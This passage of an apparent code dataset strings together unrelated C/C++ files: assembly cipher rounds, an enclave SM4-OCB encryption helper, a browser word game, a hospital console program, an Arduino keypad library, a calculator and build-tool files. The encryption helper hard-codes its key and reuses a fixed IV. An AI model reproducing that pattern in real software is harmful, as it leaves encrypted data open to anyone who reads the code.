edi\r\n\t\t\txor esi, edx\r\n\t\t\tshr ebx, 0x10\r\n\t\t\tmov edx, edi\r\n\t\t\tmov al, bh\r\n\t\t\tand ebx, 0x000000FF\r\n\t\t\tmov cl, dh\r\n\t\t\tand edx, 0x000000FF\r\n\t\t\tmov eax, [ebp + eax * 4 + 0x48]\r\n\t\t\tmov ebx, [ebp + ebx * 4 + 0x00000448]\r\n\t\t\tadd ebx, eax\r\n\t\t\tmov eax, [ebp + ecx * 4 + 0x00000848]\r\n\t\t\txor ebx, eax\r\n\t\t\tmov edx, [ebp + edx * 4 + 0x00000C48]\r\n\t\t\tadd ebx, edx\r\n\t\t\txor eax, eax\r\n\t\t\txor esi, ebx\r\n\t\t\tmov edx, [ebp + 0x18]\r\n\t\t\tmov ebx, esi\r\n\t\t\txor edi, edx\r\n\t\t\tshr ebx, 0x10\r\n\t\t\tmov edx, esi\r\n\t\t\tmov al, bh\r\n\t\t\tand ebx, 0x000000FF\r\n\t\t\tmov cl, dh\r\n\t\t\tand edx, 0x000000FF\r\n\t\t\tmov eax, [ebp + eax * 4 + 0x48]\r\n\t\t\tmov ebx, [ebp + ebx * 4 + 0x00000448]\r\n\t\t\tadd ebx, eax\r\n\t\t\tmov eax, [ebp + ecx * 4 + 0x00000848]\r\n\t\t\txor ebx, eax\r\n\t\t\tmov edx, [ebp + edx * 4 + 0x00000C48]\r\n\t\t\tadd ebx, edx\r\n\t\t\txor eax, eax\r\n\t\t\txor edi, ebx\r\n\t\t\tmov edx, [ebp + 0x1C]\r\n\t\t\tmov ebx, edi\r\n\t\t\txor esi, edx\r\n\t\t\tshr ebx, 0x10\r\n\t\t\tmov edx, edi\r\n\t\t\tmov al, bh\r\n\t\t\tand ebx, 0x000000FF\r\n\t\t\tmov cl, dh\r\n\t\t\tand edx, 0x000000FF\r\n\t\t\tmov eax, [ebp + eax * 4 + 0x48]\r\n\t\t\tmov ebx, [ebp + ebx * 4 + 0x00000448]\r\n\t\t\tadd ebx, eax\r\n\t\t\tmov eax, [ebp + ecx * 4 + 0x000008",
    "#include \"../include/util.h\"\n\nextern \"C\" void eapp_print(const char*s, ...);\n\nconst unsigned char key[16]={0x98,0xff,0xf6,0x7e,0x64,0xe4,0x6b,0xe5,0xee,0x2e,0x05,0xcc,0x9a,0xf6,0xd0,0x12};\nconst unsigned char IV[16] ={0x2d,0xfb,0x42,0x9a,0x48,0x69,0x7c,0x34,0x00,0x6d,0xa8,0x86,0x9a,0xf6,0xd0,0x12};\n\nvoid printHex(unsigned char *c, int n)\n{\n    int i, rounds;\n    rounds = n / 16;\n    for (i = 0; i < rounds; i++) {\n        eapp_print(\"%d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d\\n\",\n                   *(c+i*16), *(c+i*16+1), *(c+i*16+2), *(c+i*16+3),\n                   *(c+i*16+4), *(c+i*16+5), *(c+i*16+6), *(c+i*16+7),\n                   *(c+i*16+8), *(c+i*16+9), *(c+i*16+10), *(c+i*16+11),\n                   *(c+i*16+12), *(c+i*16+13), *(c+i*16+14), *(c+i*16+15));\n    }\n}\n\nuint256_t bswap256(const uint256_t& value){\n    uint64_t uint64_list[4] = {value.upper().upper(), value.upper().lower(), value.lower().upper(), value.lower().lower()};\n    for(int i = 0; i < 4; i++){\n        uint64_list[i] = __builtin_bswap64(uint64_list[i]);\n    }\n    uint128_t new_upper(uint64_list[3], uint64_list[2]);\n    uint128_t new_lower(uint64_list[1], uint64_list[0]);\n    uint256_t new_value(new_upper, new_lower);\n    return new_value;\n}\n\nvoid store_uint256_to_uint8_vector(const uint256_t& value, uint8_t* to){\n    uint256_t new_value = bswap256(value);\n    std::memcpy(to, &new_value, sizeof(new_value));\n}\n\nuint256_t uint8_vector_to_uint256(const uint8_t* from, size_t size){\n    uint8_t uint8_list[32] = {};\n    int offset = 32 - size;\n    std::memcpy(uint8_list + offset, from, size);\n    uint256_t old_value;\n    std::memcpy(&old_value, uint8_list, sizeof(old_value));\n    return bswap256(old_value);\n}\n\nvoid print_uint256(const uint256_t& value, int base){\n    std::string value_string = value.str(base);\n    char* real_value_string = (char*)value_string.data();\n    eapp_print(\"value = %s\\n\", real_value_string);\n}\n\nvoid encrypt_data(unsigned char* plaintext, int plaintext_len, unsigned char* ciphertext, int* ciphertext_len){\n    *ciphertext_len = OCB_CipherText_Len(plaintext_len);\n    unsigned char cipher_with_tag[*ciphertext_len + OCB_TAG_SIZE];\n\n    SM4_OCB_Encrypt(key, IV, (unsigned int)16, plaintext, plaintext_len, NULL, 0, cipher_with_tag);\n\n    *ciphertext_len = (*ciphertext_len) + OCB_TAG_SIZE;\n    for(int i = 0; i < *ciphertext_len; i++){\n        ciphertext[i] = cipher_with_tag[i];\n    }\n}\n\nvoid decrypt_data(unsigned char* cipher_with_tag, int cipher_with_tag_len, unsigned char* plaintext, int* plaintext_len){\n    *plaintext_len = cipher_with_tag_len - OCB_TAG_SIZE;\n    int ret;\n    ret = SM4_OCB_Decrypt(key, IV, (unsigned int)16, cipher_with_tag, *plaintext_len, NULL, 0, plaintext);\n    if(ret != 0){\n        eapp_print(\"Fail Assenticate\\n\");\n    }\n}",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include <fstream>\n#include <map>\n#include <set>\n#include <sstream>\n#include \"visutils.h\"\n#include <emscripten/fetch.h>\n#include <random>\n\nconst int lsize = 40;\n\nbool game_running;\nbool game_restricted;\nbool is_daily;\nint daily;\n\nint next_id;\nint shop_id;\n\nenum class language_state { not_fetched, fetch_started, fetch_progress, fetch_success, fetch_fail };\n\nstruct language {\n  language_state state;\n  map<int, set<string>> dictionary;\n  set<string> naughty;\n  string name;\n  string gamename;\n  string fname;\n  string flag;\n  int offset, bytes;\n  vector<string> alphabet;\n  language(const string& name, const string& gamename, const string& fname, const string& alph, const string& flag);\n  };\n\nint utf8_len(char ch) {\n  unsigned char uch = (unsigned char) ch;\n  if(uch < 128) return 1;\n  if(uch >= 192 && uch < 224) return 2;\n  if(uch >= 224 && uch < 240) return 3;\n  if(uch >= 240 && uch < 248) return 4;\n  return 5;\n  }\n\nint utf8_length(const string& s) {\n  int i = 0;\n  int len = 0;\n  while(i < s.size()) i += utf8_len(s[i]), len++;\n  return len;\n  }\n\nlanguage english(\"English\", \"SEUPHORICA\", \"wordlist.txt\", \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\", \"\ud83c\uddec\ud83c\udde7\");\nlanguage polski(\"polski\", \"SEUFORIKA\", \"slowa.txt\", \"A\u0104BC\u0106DE\u0118FGHIJKL\u0141MN\u0143O\u00d3PRS\u015aTUWYZ\u0179\u017b\", \"\ud83c\uddf5\ud83c\uddf1\");\nlanguage deutsch(\"deutsch\", \"SEUFORIKA\", \"german.txt\", \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\u00c4\u00dc\u00d6\", \"\ud83c\udde9\ud83c\uddea\");\nlanguage francais(\"fran\u00e7ais\", \"SEUFORICA\", \"french.txt\", \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\", \"\ud83c\uddeb\ud83c\uddf7\");\nlanguage espanol(\"espa\u00f1ol\", \"SEUFORICA\", \"fise-2.txt\", \"ABCDEFGHIJKLMN\u00d1OPQRSTUVWXYZ\", \"\ud83c\uddea\ud83c\uddf8\");\n\nlanguage *current = &english;\n\nset<language*> polyglot_languages = {};\n\nvector<language*> languages = {&english, &francais, &deutsch, &espanol, &polski};\n\nlanguage::language(const string& name, const string& gamename, const string& fname, const string& alph, const string& flag) : name(name), gamename(gamename), fname(fname), flag(flag) {\n  int i = 0;\n  while(i < alph.size()) {\n    int len = utf8_len(alph[i]);\n    string letter = alph.substr(i, len);\n    i += len;\n    alphabet.push_back(letter);\n    }\n  }\n\nvoid draw_board();\n\nvoid downloadSucceeded(emscripten_fetch_t *fetch) {\n  language& l = *((language*) fetch->userData);\n  string s;\n  for(int i=0; i<fetch->numBytes; i++) {\n    char ch = fetch->data[i];\n    if(ch == 10) { l.dictionary[utf8_length(s)].insert(s); s = \"\"; }\n    else s += ch;\n    }\n  l.dictionary[utf8_length(l.gamename)].insert(l.gamename);\n  l.state = language_state::fetch_success;\n  emscripten_fetch_close(fetch);\n  draw_board();\n  }\n\nvoid downloadSucceeded_naughty(emscripten_fetch_t *fetch) {\n  language& l = *((language*) fetch->userData);\n  string s;\n  for(int i=0; i<fetch->numBytes; i++) {\n    char ch = fetch->data[i];\n    if(ch == 10) { l.naughty.insert(s); s = \"\"; }\n    else s += ch;\n    }\n  l.state = language_state::fetch_success;\n  emscripten_fetch_close(fetch);\n  draw_board();\n  }\n\nvoid downloadFailed(emscripten_fetch_t *fetch) {\n  language& l = *((language*) fetch->userData);\n  l.state = language_state::fetch_fail;\n  emscripten_fetch_close(fetch);\n  draw_board();\n  }\n\nvoid downloadProgress(emscripten_fetch_t *fetch) {\n  language& l = *((language*) fetch->userData);\n  l.state = language_state::fetch_progress;\n  l.bytes = fetch->totalBytes;\n  l.offset = fetch->dataOffset;\n  draw_board();\n  }\n\nvoid read_dictionary(language& l) {\n  emscripten_fetch_attr_t attr;\n  emscripten_fetch_attr_init(&attr);\n  strcpy(attr.requestMethod, \"GET\");\n  attr.attributes = EMSCRIPTEN_FETCH_LOAD_TO_MEMORY | EMSCRIPTEN_FETCH_PERSIST_FILE;\n  attr.userData = &l;\n  attr.onsuccess = downloadSucceeded;\n  attr.onerror = downloadFailed;\n  attr.onprogress = downloadProgress;\n  l.state = language_state::fetch_started;\n  emscripten_fetch(&attr, l.fname.c_str());\n  }\n\nvoid read_naughty_dictionary(language& l) {\n  emscripten_fetch_attr_t attr;\n  emscripten_fetch_attr_init(&attr);\n  strcpy(attr.requestMethod, \"GET\");\n  attr.attributes = EMSCRIPTEN_FETCH_LOAD_TO_MEMORY | EMSCRIPTEN_FETCH_PERSIST_FILE;\n  attr.userData = &l;\n  attr.onsuccess = downloadSucceeded_naughty;\n  attr.onerror = downloadFailed;\n  attr.onprogress = downloadProgress;\n  l.state = language_state::fetch_started;\n  emscripten_fetch(&attr, (\"naughty-\" + l.fname).c_str());\n  }\n\nbool ok(const string& word, int len, language* cur) {\n  return cur->dictionary[len].count(word);\n  }\n\nbool is_naughty(const string& word, language* cur) {\n  return cur->naughty.count(word);\n  }\n\nbool not_in_base(const string& letter) {\n  for(auto& x: current->alphabet) if(x == letter) return false;\n  return true;\n  }\n\nbool eqcap(string a, string b) {\n  for(char& c: a) c = toupper(c);\n  for(char& c: b) c = toupper(c);\n  return a == b;\n  }\n\nstruct polystring_base {\n  virtual string get() = 0;\n  virtual ~polystring_base() {}\n  virtual bool eqcap(const string& s) = 0;\n  };\n\nstruct polyleaf : public polystring_base {\n  string b;\n  string get() { return b; }\n  polyleaf(const string& s) : b(s) {}\n  virtual bool eqca",
    "#include <iostream>\r\n#include<fstream>\r\n#include <string>\r\n#include <conio.h>\r\n#include <windows.h>\r\n#include <ctime>\r\n#include<cctype>\r\n#include<limits>\r\nusing namespace std;\r\n//functions prototype starts\r\nvoid topheading();\r\nvoid header();\r\nvoid delay(int milliseconds);\r\nvoid showLoadingAnimation();\r\nvoid gotoxy(int x, int y);\r\nvoid multaninterface();\r\nvoid islamabadinterface();\r\nvoid lahoreinterface();\r\nstring login();\r\nvoid thankyou();\r\nvoid clear();\r\nvoid hideCursor();\r\nstring adminmenu();\r\nint check_integer(string num);\r\nvoid prescription();\r\nvoid addpatient(int &addpatientindex, string patientname[], string patientage[], string patientcnic[], string patientbloodgroup[], string patienthistory[], string visitdatepatient[], string patientphonenumber[], string filenameaddpatient);\r\nvoid dischargepatient(string dischargepatientcnic, int addpatientindex, string patientcnic[], string patientname[], string patientage[], string patientbloodgroup[], string patienthistory[], string patientphonenumber[], string visitdatepatient[], string filenameaddpatient);\r\nvoid viewpatient(int &addpatientindex, string patientname[], string patientage[], string patientcnic[], string patientbloodgroup[], string patienthistory[], string visibledatepatient[], string patientphonenumber[]);\r\nvoid changingsalary(string doctorsalary, string managersalary, string filenamecahngingsalary);\r\nvoid profitloss(string patientcharges, int addpatientindex, string filenameprofitloss);\r\nvoid addbed(string bedadd, string filenameaddbed);\r\nvoid adddoctor(string doctorname[], string doctorspeciality[], int &adddoctorindex, string filenameadddoctor);\r\nvoid viewdoctor(string doctorname[], string doctorspeciality[],string hire[], int &adddoctorindex);\r\nvoid changeequipmentmanager(int &managercheck, string &equipmentmanagername, string &equipmentmanagergender, string &equipmentmanagercnic, string filenameaddequipmentmanager);\r\nvoid addequipmentmanager(string equipmentmanagername, string equipmentmanagergender, string equipmentmanagercnic, int &managercheck, string filenameaddequipmentmanager);\r\nvoid updatepatient(string updatepatientcnic, string patientcnic[], int &addpatientindex, string patientname[], string patientage[], string patientbloodgroup[], string patienthistory[], string visitdatepatient[], string patientphonenumber[], string filenameaddpatient);\r\nstring pateintmenu();\r\nvoid doctorschedule(string doctorname[], string doctorspeciality[],string hire[], int &adddoctorindex);\r\nvoid viewdoctorslist(string doctorname[], string doctorspeciality[],string hire[], int &adddoctorindex);\r\nvoid selectdoctor(string selectdoctorname, string selectdoctorspeciality, int &adddoctorindex, string doctorname[], string doctorspeciality[], string hire[]);\r\nvoid availablebeds(string bedadd, int &addpatientindex);\r\nvoid billinginvoice(string servicetype[], int &addbillingindex, string daysstayes[], string roomtype[]);\r\nvoid reviewhearth();\r\nvoid bilslip(string servicetype[], string daysstayes[], string roomtype[], int &addbillingindex);\r\nstring viewprescription();\r\nvoid patientreview(string review[], int &addpatientindex);\r\nstring pharmacymenu();\r\nvoid addmedicineform(string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string medicinebatchnumber[], int &addmedicineindex, string filenameaddmedicine);\r\nvoid viewmedicineform(string buymedicinequantity, int &addmedicineindex, string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string medicinebatchnumber[], string filenameaddmedicine);\r\nvoid updatemedicineform(string updatemedicinebatchnumber, string medicinebatchnumber[], int &addmedicineindex, string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string filenameaddmedicine);\r\nstring doctormenu();\r\nvoid buymedicines(string buymedicinequantity, string purchasemedicines, int &addmedicineindex, string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string medicinebatchnumber[], string filenamebuymedicines);\r\nbool charactermCheck(string characterCheck);\r\nvoid expiredmedicine(int addmedicineindex, string currentdate[], string medicineexpirydate[], string medicinename[]);\r\nbool recursionCheck(string check, string recursion[], int size);\r\nbool checkenter(string check);\r\nbool gendercheck(string check);\r\nbool digitscheck(string digits);\r\nbool checkshiftin(string check[]);\r\nvoid addmanager(string managername, string managercnic);\r\nvoid medicineindemand();\r\nint convertDatetodays(string date); \r\nbool isExpired(string currentDate, string expiryDate);\r\nvoid removemedicine(string updatemedicinebatchnumber, int &addmedicineindex, string medicinebatchnumber[], string medicinename[], string medicinequantity[], string medicineexpirydate[], string medicineprice[], string filenameaddmedicine);\r\nvoid addemploy(string employname[], int &addemployindex, string employcnic[], string employphonenumbe",
    "/*\n||\n|| @file Keypad.cpp\n|| @version 3.1\n|| @author Mark Stanley, Alexander Brevig\n|| @contact mstanley@technologist.com, alexanderbrevig@gmail.com\n||\n|| @description\n|| | This library provides a simple interface for using matrix\n|| | keypads. It supports multiple keypresses while maintaining\n|| | backwards compatibility with the old single key library.\n|| | It also supports user selectable pins and definable keymaps.\n|| #\n||\n|| @license\n|| | This library is free software; you can redistribute it and/or\n|| | modify it under the terms of the GNU Lesser General Public\n|| | License as published by the Free Software Foundation; version\n|| | 2.1 of the License.\n|| |\n|| | This library is distributed in the hope that it will be useful,\n|| | but WITHOUT ANY WARRANTY; without even the implied warranty of\n|| | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n|| | Lesser General Public License for more details.\n|| |\n|| | You should have received a copy of the GNU Lesser General Public\n|| | License along with this library; if not, write to the Free Software\n|| | Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n|| #\n||\n*/\n#include <Keypad.h>\n\n// <<constructor>> Allows custom keymap, pin configuration, and keypad sizes.\nKeypad::Keypad(char *userKeymap, byte *row, byte *col, byte numRows, byte numCols) {\n\trowPins = row;\n\tcolumnPins = col;\n\tsizeKpd.rows = numRows;\n\tsizeKpd.columns = numCols;\n\n\tbegin(userKeymap);\n\n\tsetDebounceTime(10);\n\tsetHoldTime(500);\n\tkeypadEventListener = 0;\n\n\tstartTime = 0;\n\tsingle_key = false;\n}\n\n// Let the user define a keymap - assume the same row/column count as defined in constructor\nvoid Keypad::begin(char *userKeymap) {\n    keymap = userKeymap;\n}\n\n// Returns a single key only. Retained for backwards compatibility.\nchar Keypad::getKey() {\n\tsingle_key = true;\n\n\tif (getKeys() && key[0].stateChanged && (key[0].kstate==PRESSED))\n\t\treturn key[0].kchar;\n\t\n\tsingle_key = false;\n\n\treturn NO_KEY;\n}\n\n// Populate the key list.\nbool Keypad::getKeys() {\n\tbool keyActivity = false;\n\n\t// Limit how often the keypad is scanned. This makes the loop() run 10 times as fast.\n\tif ( (millis()-startTime)>debounceTime ) {\n\t\tscanKeys();\n\t\tkeyActivity = updateList();\n\t\tstartTime = millis();\n\t}\n\n\treturn keyActivity;\n}\n\n// Private : Hardware scan\nvoid Keypad::scanKeys() {\n\t// Re-intialize the row pins. Allows sharing these pins with other hardware.\n\tfor (byte r=0; r<sizeKpd.rows; r++) {\n\t\tpin_mode(rowPins[r],INPUT_PULLUP);\n\t}\n\n\t// bitMap stores ALL the keys that are being pressed.\n\tfor (byte c=0; c<sizeKpd.columns; c++) {\n\t\tpin_mode(columnPins[c],OUTPUT);\n\t\tpin_write(columnPins[c], LOW);\t// Begin column pulse output.\n\t\tfor (byte r=0; r<sizeKpd.rows; r++) {\n\t\t\tbitWrite(bitMap[r], c, !pin_read(rowPins[r]));  // keypress is active low so invert to high.\n\t\t}\n\t\t// Set pin to high impedance input. Effectively ends column pulse.\n\t\tpin_write(columnPins[c],HIGH);\n\t\tpin_mode(columnPins[c],INPUT);\n\t}\n}\n\n// Manage the list without rearranging the keys. Returns true if any keys on the list changed state.\nbool Keypad::updateList() {\n\n\tbool anyActivity = false;\n\n\t// Delete any IDLE keys\n\tfor (byte i=0; i<LIST_MAX; i++) {\n\t\tif (key[i].kstate==IDLE) {\n\t\t\tkey[i].kchar = NO_KEY;\n\t\t\tkey[i].kcode = -1;\n\t\t\tkey[i].stateChanged = false;\n\t\t}\n\t}\n\n\t// Add new keys to empty slots in the key list.\n\tfor (byte r=0; r<sizeKpd.rows; r++) {\n\t\tfor (byte c=0; c<sizeKpd.columns; c++) {\n\t\t\tboolean button = bitRead(bitMap[r],c);\n\t\t\tchar keyChar = keymap[r * sizeKpd.columns + c];\n\t\t\tint keyCode = r * sizeKpd.columns + c;\n\t\t\tint idx = findInList (keyCode);\n\t\t\t// Key is already on the list so set its next state.\n\t\t\tif (idx > -1)\t{\n\t\t\t\tnextKeyState(idx, button);\n\t\t\t}\n\t\t\t// Key is NOT on the list so add it.\n\t\t\tif ((idx == -1) && button) {\n\t\t\t\tfor (byte i=0; i<LIST_MAX; i++) {\n\t\t\t\t\tif (key[i].kchar==NO_KEY) {\t\t// Find an empty slot or don't add key to list.\n\t\t\t\t\t\tkey[i].kchar = keyChar;\n\t\t\t\t\t\tkey[i].kcode = keyCode;\n\t\t\t\t\t\tkey[i].kstate = IDLE;\t\t// Keys NOT on the list have an initial state of IDLE.\n\t\t\t\t\t\tnextKeyState (i, button);\n\t\t\t\t\t\tbreak;\t// Don't fill all the empty slots with the same key.\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\t// Report if the user changed the state of any key.\n\tfor (byte i=0; i<LIST_MAX; i++) {\n\t\tif (key[i].stateChanged) anyActivity = true;\n\t}\n\n\treturn anyActivity;\n}\n\n// Private\n// This function is a state machine but is also used for debouncing the keys.\nvoid Keypad::nextKeyState(byte idx, boolean button) {\n\tkey[idx].stateChanged = false;\n\n\tswitch (key[idx].kstate) {\n\t\tcase IDLE:\n\t\t\tif (button==CLOSED) {\n\t\t\t\ttransitionTo (idx, PRESSED);\n\t\t\t\tholdTimer = millis(); }\t\t// Get ready for next HOLD state.\n\t\t\tbreak;\n\t\tcase PRESSED:\n\t\t\tif ((millis()-holdTimer)>holdTime)\t// Waiting for a key HOLD...\n\t\t\t\ttransitionTo (idx, HOLD);\n\t\t\telse if (button==OPEN)\t\t\t\t// or for a key to be RELEASED.\n\t\t\t\ttransitionTo (idx, RELEASED);\n\t\t\tbreak;\n\t\tcase HOLD:\n\t\t\tif (button==OPEN)\n\t\t\t\ttransitionTo (idx, RELEASED);\n\t\t\tbreak;\n\t\tcase RELEASED",
    "#include <iostream>\n#include \"Functions.h\"\n\nusing namespace std;\n\nint main()\n{\n\n    while (true)\n    {\n\n        char choice;\n        cout << \"Enter 1 to convert infix to prefix.\\n\"\n                \"Enter 2 to convert infix to postfix.\\n\"\n                \"Enter 3 to evaluate prefix.\\n\"\n                \"Enter 4 to evaluate postfix.\\n\"\n                \"Enter 0 to exit.\\n\"\n                \"You entered: \";\n        cin >> choice;\n\n        switch (choice)\n        {\n        case '1':\n        {\n            string infix;\n            cout << \"Enter the infix, you want to convert to prefix: \";\n            cin >> infix;\n\n            cout << \"Infix: \" << infix << \"\\n\";\n            cout << \"Converted Prefix: \" << infixToPrefix(infix) << \"\\n\";\n            cout << \"Note: If you see infix as converted prefix, it means that the infix you entered is invalid.\\n\";\n            break;\n        }\n        case '2':\n        {\n            string infix;\n            cout << \"Enter the infix, you want to convert to postfix: \";\n            cin >> infix;\n\n            cout << \"Infix: \" << infix << \"\\n\";\n            cout << \"Converted Postfix: \" << infixToPostfix(infix) << \"\\n\";\n            cout << \"Note: If you see infix as converted postfix, it means that the infix you entered is invalid.\\n\";\n            break;\n        }\n        case '3':\n        {\n            std::string prefix;\n            cout << \"Enter the prefix, you want to evaluate: \";\n            cin >> prefix;\n\n            cout << \"Prefix: \" << prefix << \"\\n\";\n            cout << \"Result: \" << evaluatePrefix(prefix) << \"\\n\";\n            break;\n        }\n        case '4':\n        {\n            std::string postfix;\n            cout << \"Enter the postfix, you want to evaluate: \";\n            cin >> postfix;\n\n            cout << \"Postfix: \" << postfix << \"\\n\";\n            cout << \"Result: \" << evaluatePostfix(postfix) << \"\\n\";\n            break;\n        }\n        case '0':\n            exit(0);\n        default:\n            cout << \"Invalid input, please try again.\\n\";\n            break;\n        }\n    }\n}",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int 